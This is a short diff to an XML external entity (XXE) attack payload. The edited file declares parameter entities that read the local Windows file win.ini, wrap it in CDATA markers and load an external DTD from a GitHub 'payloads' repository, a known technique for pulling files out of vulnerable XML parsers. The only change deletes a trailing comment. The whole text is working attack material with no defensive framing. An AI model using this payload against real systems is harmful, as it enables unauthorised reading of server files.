@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">   <!-- smaller file, fewer special chars -->
+<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/mrlaksh20/payloads/main/dtd.xml">
